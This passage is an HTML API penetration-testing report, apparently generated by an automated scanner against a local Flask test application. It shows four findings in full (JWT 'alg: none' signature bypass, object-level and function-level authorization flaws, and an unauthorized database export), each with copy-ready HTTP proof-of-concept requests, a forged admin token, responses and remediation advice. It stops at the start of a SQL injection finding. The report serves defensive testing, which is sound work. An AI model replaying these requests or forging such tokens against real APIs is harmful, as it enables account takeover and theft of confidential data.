@@ -1,0 +1,2206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API Security Assessment & VAPT Report</title>
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --border-color: #334155;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --critical: #ef4444;
+            --high: #f97316;
+            --medium: #eab308;
+            --low: #3b82f6;
+            --info: #64748b;
+            --success: #10b981;
+            --accent: #6366f1;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            padding: 2rem 1rem;
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        header {
+            margin-bottom: 2rem;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 1.5rem;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .title-badge {
+            display: inline-block;
+            background: rgba(99, 102, 241, 0.2);
+            color: #818cf8;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            border: 1px solid rgba(99, 102, 241, 0.4);
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 800;
+            letter-spacing: -0.025em;
+        }
+
+        .metadata-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1.5rem;
+            background: var(--card-bg);
+            padding: 1rem 1.5rem;
+            border-radius: 0.5rem;
+            border: 1px solid var(--border-color);
+        }
+
+        .meta-item span {
+            display: block;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .meta-item strong {
+            font-size: 1rem;
+            color: #e2e8f0;
+        }
+
+        /* Severity Stats Cards */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            border-radius: 0.5rem;
+            padding: 1.25rem;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.15s, border-color 0.15s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+            border-color: #64748b;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+        }
+
+        .stat-critical::before { background: var(--critical); }
+        .stat-high::before { background: var(--high); }
+        .stat-medium::before { background: var(--medium); }
+        .stat-low::before { background: var(--low); }
+        .stat-info::before { background: var(--info); }
+        .stat-total::before { background: var(--accent); }
+
+        .stat-num {
+            font-size: 2.25rem;
+            font-weight: 800;
+            line-height: 1;
+            margin: 0.5rem 0;
+        }
+
+        .stat-label {
+            font-size: 0.875rem;
+            color: var(--text-muted);
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        /* Controls: Filter & Search */
+        .controls-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            background: var(--card-bg);
+            padding: 0.75rem 1.25rem;
+            border-radius: 0.5rem;
+            border: 1px solid var(--border-color);
+            margin-bottom: 1.5rem;
+        }
+
+        .filter-buttons {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: #0f172a;
+            color: var(--text-muted);
+            border: 1px solid var(--border-color);
+            padding: 0.35rem 0.75rem;
+            border-radius: 0.375rem;
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .filter-btn:hover, .filter-btn.active {
+            background: var(--accent);
+            color: #ffffff;
+            border-color: var(--accent);
+        }
+
+        .search-box {
+            display: flex;
+            align-items: center;
+            background: #0f172a;
+            border: 1px solid var(--border-color);
+            border-radius: 0.375rem;
+            padding: 0.35rem 0.75rem;
+        }
+
+        .search-box input {
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            outline: none;
+            font-size: 0.875rem;
+            width: 220px;
+        }
+
+        /* Severity Badges */
+        .badge {
+            padding: 0.25rem 0.6rem;
+            border-radius: 0.25rem;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            display: inline-block;
+        }
+        .badge-CRITICAL { background: rgba(239, 68, 68, 0.2); color: #fca5a5; border: 1px solid var(--critical); }
+        .badge-HIGH { background: rgba(249, 115, 22, 0.2); color: #fdba74; border: 1px solid var(--high); }
+        .badge-MEDIUM { background: rgba(234, 179, 8, 0.2); color: #fde047; border: 1px solid var(--medium); }
+        .badge-LOW { background: rgba(59, 130, 246, 0.2); color: #93c5fd; border: 1px solid var(--low); }
+        .badge-INFO { background: rgba(100, 116, 139, 0.2); color: #cbd5e1; border: 1px solid var(--info); }
+        .badge-RESOLVED { background: rgba(16, 185, 129, 0.2); color: #6ee7b7; border: 1px solid var(--success); }
+
+        /* Findings List */
+        .section-header {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .finding-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 0.5rem;
+            margin-bottom: 1.25rem;
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+
+        .finding-card:hover {
+            border-color: #64748b;
+        }
+
+        .finding-header {
+            padding: 1.25rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            user-select: none;
+            background: rgba(30, 41, 59, 0.7);
+        }
+
+        .finding-header:hover {
+            background: rgba(51, 65, 85, 0.5);
+        }
+
+        .finding-title-group {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .finding-id {
+            color: var(--text-muted);
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        .finding-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #f1f5f9;
+        }
+
+        .toggle-icon {
+            font-size: 0.85rem;
+            color: #94a3b8;
+            margin-left: 0.75rem;
+            transition: transform 0.2s;
+            display: inline-block;
+        }
+
+        .finding-content {
+            padding: 1.5rem;
+            border-top: 1px solid var(--border-color);
+            display: block; /* default open */
+        }
+
+        .finding-content.collapsed {
+            display: none;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1.25rem;
+            background: rgba(15, 23, 42, 0.6);
+            padding: 1rem;
+            border-radius: 0.375rem;
+            font-size: 0.9rem;
+        }
+
+        .info-label {
+            color: var(--text-muted);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .poc-box {
+            margin-top: 1rem;
+        }
+
+        .poc-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #cbd5e1;
+            margin-bottom: 0.4rem;
+        }
+
+        .copy-btn {
+            background: #1e293b;
+            color: #94a3b8;
+            border: 1px solid #334155;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { color: #fff; background: #334155; }
+
+        pre {
+            background: #090d16;
+            border: 1px solid #1e293b;
+            border-radius: 0.375rem;
+            padding: 1rem;
+            color: #38bdf8;
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            font-size: 0.825rem;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin-bottom: 1rem;
+        }
+
+        .callout-box {
+            padding: 1rem;
+            border-radius: 0.375rem;
+            margin-top: 1rem;
+            font-size: 0.925rem;
+        }
+
+        .impact-box {
+            background: rgba(239, 68, 68, 0.1);
+            border-left: 4px solid var(--critical);
+        }
+
+        .remediation-box {
+            background: rgba(16, 185, 129, 0.1);
+            border-left: 4px solid var(--success);
+        }
+
+        .box-title {
+            font-weight: 700;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            margin-bottom: 0.5rem;
+        }
+
+        .impact-box .box-title { color: #f87171; }
+        .remediation-box .box-title { color: #34d399; }
+
+        footer {
+            margin-top: 3rem;
+            border-top: 1px solid var(--border-color);
+            padding-top: 1.5rem;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="header-top">
+                <div>
+                    <div class="title-badge">Automated VAPT & API Security Assessment</div>
+                    <h1>API Penetration Testing & Vulnerability Assessment Report</h1>
+                </div>
+                <div>
+                    <span class="badge badge-CRITICAL RISK">CRITICAL RISK</span>
+                </div>
+            </div>
+
+            <div class="metadata-grid">
+                <div class="meta-item">
+                    <span>Target URL</span>
+                    <strong>http://127.0.0.1:5000</strong>
+                </div>
+                <div class="meta-item">
+                    <span>Scan Timestamp</span>
+                    <strong>2026-11-02 21:32:18</strong>
+                </div>
+                <div class="meta-item">
+                    <span>Scope Policy</span>
+                    <strong>Restricted to Localhost & Whitelist</strong>
+                </div>
+                <div class="meta-item">
+                    <span>Assessment Framework</span>
+                    <strong>OWASP API Security Top 10</strong>
+                </div>
+            </div>
+        </header>
+
+        <!-- Stats Grid -->
+        <div class="stats-grid">
+            <div class="stat-card stat-total" onclick="filterBySeverity('ALL')">
+                <div class="stat-label">Total Findings</div>
+                <div class="stat-num" style="color: var(--accent);">16</div>
+            </div>
+            <div class="stat-card stat-critical" onclick="filterBySeverity('CRITICAL')">
+                <div class="stat-label">Critical</div>
+                <div class="stat-num" style="color: var(--critical);">6</div>
+            </div>
+            <div class="stat-card stat-high" onclick="filterBySeverity('HIGH')">
+                <div class="stat-label">High</div>
+                <div class="stat-num" style="color: var(--high);">7</div>
+            </div>
+            <div class="stat-card stat-medium" onclick="filterBySeverity('MEDIUM')">
+                <div class="stat-label">Medium</div>
+                <div class="stat-num" style="color: var(--medium);">1</div>
+            </div>
+            <div class="stat-card stat-low" onclick="filterBySeverity('LOW')">
+                <div class="stat-label">Low</div>
+                <div class="stat-num" style="color: var(--low);">1</div>
+            </div>
+            <div class="stat-card stat-info" onclick="filterBySeverity('INFO')">
+                <div class="stat-label">Info</div>
+                <div class="stat-num" style="color: var(--info);">1</div>
+            </div>
+        </div>
+
+        <!-- Controls: Filter & Search -->
+        <div class="controls-bar">
+            <div class="filter-buttons">
+                <button class="filter-btn active" onclick="filterBySeverity('ALL')">All (16)</button>
+                <button class="filter-btn" onclick="filterBySeverity('CRITICAL')">Critical (6)</button>
+                <button class="filter-btn" onclick="filterBySeverity('HIGH')">High (7)</button>
+                <button class="filter-btn" onclick="filterBySeverity('MEDIUM')">Medium (1)</button>
+                <button class="filter-btn" onclick="filterBySeverity('LOW')">Low (1)</button>
+                <button class="filter-btn" onclick="toggleAllCards()">Toggle Expand / Collapse All</button>
+            </div>
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="Search vulnerability (e.g. SQL, BOLA)..." onkeyup="searchFindings()">
+            </div>
+        </div>
+
+        <!-- Findings List -->
+        <div class="section-header">
+            <span>Identified Vulnerabilities & Technical Evidence</span>
+            <span id="findingsCount" style="font-size: 0.9rem; color: var(--text-muted); font-weight: normal;">Showing 16 items</span>
+        </div>
+
+        
+
+        
+        <div class="finding-card" data-severity="CRITICAL" data-search="VAPT-AUTH-001 JWT Signature Bypass via 'alg: none' Algorithm API2:2023 - Broken Authentication ALL Protected Endpoints (e.g. /api/v1/documents/{id})">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-CRITICAL">CRITICAL</span>
+                    <span class="finding-id">VAPT-AUTH-001</span>
+                    <span class="finding-title">JWT Signature Bypass via 'alg: none' Algorithm</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 9.8</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API2:2023 - Broken Authentication</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-347: Improper Verification of Cryptographic Signature</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET / POST / PUT / DELETE ALL Protected Endpoints (e.g. /api/v1/documents/{id})</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The server's JWT verification implementation accepts unverified tokens with header 'alg': 'none'. This allows unauthenticated external attackers to forge arbitrary tokens with administrative claims (user_id: 4, role: admin) without possessing the cryptographic secret.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/documents/1 HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI0IiwidXNlcl9pZCI6NCwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoiYm9iQGVudGVycHJpc2UtY29ycC5sb2NhbCIsInJvbGUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlLCJleHAiOjE3OTM2MjI3MzguNDkzNTMyfQ.
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 264
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "document": {
+    "classification": "RESTRICTED",
+    "content": "Confidential: Acquisition target TechNova Inc at $45M valuation. Board approved.",
+    "created_at": "2026-11-02 16:02:17",
+    "id": 1,
+    "owner_user_id": 1,
+    "title": "Q4 Financial Forecast & M&A Strategy"
+  },
+  "status": "success"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Complete compromise of user authentication and tenant isolation. An attacker can impersonate any user, including system administrators, view confidential data, and modify system state.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Explicitly specify allowed algorithms during verification (e.g., algorithms=['HS256']).
+2. Completely disable and reject tokens with 'alg': 'none'.
+3. Ensure the JWT library enforces strict cryptographic signature checks on all incoming tokens.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="CRITICAL" data-search="VAPT-BOLA-001 Broken Object Level Authorization (BOLA) in Document Retrieval API1:2023 - Broken Object Level Authorization /api/v1/documents/{id}">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-CRITICAL">CRITICAL</span>
+                    <span class="finding-id">VAPT-BOLA-001</span>
+                    <span class="finding-title">Broken Object Level Authorization (BOLA) in Document Retrieval</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 8.6</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API1:2023 - Broken Object Level Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-639: Authorization Bypass Through User-Controlled Key</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET /api/v1/documents/{id}</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The document retrieval endpoint fails to validate whether the requesting authenticated user has authorization to view the requested document. An authenticated attacker (Bob, ID: 2) successfully retrieved confidential M&A strategy documents belonging to Alice (ID: 1) by simply substituting the document ID parameter.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/documents/1 HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 264
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "document": {
+    "classification": "RESTRICTED",
+    "content": "Confidential: Acquisition target TechNova Inc at $45M valuation. Board approved.",
+    "created_at": "2026-11-02 16:02:17",
+    "id": 1,
+    "owner_user_id": 1,
+    "title": "Q4 Financial Forecast & M&A Strategy"
+  },
+  "status": "success"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Mass unauthorized data exfiltration. Attackers can iterate through numeric or predictable document identifiers to download all corporate documents, financial records, and confidential assets across all tenants.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Implement server-side authorization checks comparing the resource owner ID (document.user_id) with the user identity from the verified JWT claims (current_user.id).
+2. Implement role-based or attribute-based access control (RBAC/ABAC) policies.
+3. Use indirect or non-guessable identifiers (e.g. UUIDv4) in combination with ownership validation.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="CRITICAL" data-search="VAPT-BFLA-001 Broken Function Level Authorization - Unrestricted Admin Access API5:2023 - Broken Function Level Authorization /api/v1/admin/users">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-CRITICAL">CRITICAL</span>
+                    <span class="finding-id">VAPT-BFLA-001</span>
+                    <span class="finding-title">Broken Function Level Authorization - Unrestricted Admin Access</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 8.8</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API5:2023 - Broken Function Level Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-285: Improper Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET /api/v1/admin/users</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The administrative endpoint '/api/v1/admin/users' verifies that a token is provided, but fails to enforce role-based access control (RBAC). A low-privileged standard user (Bob) can invoke administrative functions to enumerate all system accounts and user details.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/admin/users HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 652
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "status": "success",
+  "total_users": 4,
+  "users": [
+    {
+      "created_at": "2026-11-02 16:02:17",
+      "credit_balance": 250.0,
+      "email": "alice@enterprise-corp.local",
+      "id": 1,
+      "is_admin": 0,
+      "role": "user",
+      "username": "alice"
+    },
+    {
+      "created_at": "2026-11-02 16:02:17",
+      "credit_balance": 50.0,
+      "email": "bob@enterprise-corp.local",
+      "id": 2,
+      "is_admin": 0,
+      "role": "user",
+      "username": "bob"
+    },
+    {
+      "created_at": "2026-11-02 16:02:17",
+      "credit_balance": 120.0,
+      "email": "charlie@enterprise-corp.local",
+      "id": 3,
+      "is_admin": 0,
+      "role": "user",
+      "username": "charlie"
+    },
+    {
+      "created_at": "2026-11-02 16:02:17",
+      "credit_balance": 9999.0,
+      "email": "admin@enterprise-corp.local",
+      "id": 4,
+      "is_admin": 1,
+      "role": "admin",
+      "username": "admin"
+    }
+  ]
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Vertical privilege escalation. Low-privileged users can execute administrative operations, access internal employee databases, and manipulate privileged enterprise resources.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Implement strict server-side role and permission checks on all administrative endpoints (e.g., ensure user.role == 'admin' and user.is_admin == True).
+2. Adopt a centralized authorization policy enforcement point (PEP) or middleware decorator.
+3. Return HTTP 403 Forbidden whenever a non-administrative principal attempts access.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="CRITICAL" data-search="VAPT-BFLA-002 Unauthorized Administrative Database Export Trigger API5:2023 - Broken Function Level Authorization /api/v1/admin/export-db">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-CRITICAL">CRITICAL</span>
+                    <span class="finding-id">VAPT-BFLA-002</span>
+                    <span class="finding-title">Unauthorized Administrative Database Export Trigger</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 8.8</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API5:2023 - Broken Function Level Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-285: Improper Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>POST /api/v1/admin/export-db</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">A standard non-administrative user was able to execute the administrative database export routine, allowing unauthorized initiation of full database backups.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>POST /api/v1/admin/export-db HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
+Content-Length: 0
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 119
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "archive_url": "/backups/vapt_testbed_backup.sqlite",
+  "message": "Database backup archive generated",
+  "status": "success"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Unauthorized data backup generation and full database dump exposure.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">Enforce administrative authorization checks before triggering backup or export tasks.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="CRITICAL" data-search="VAPT-SQLI-001 SQL Injection in Product Search Parameter ('q') OWASP API Top 10 - Injection Flaws /api/v1/products/search">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-CRITICAL">CRITICAL</span>
+                    <span class="finding-id">VAPT-SQLI-001</span>
+                    <span class="finding-title">SQL Injection in Product Search Parameter ('q')</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 9.8</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>OWASP API Top 10 - Injection Flaws</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
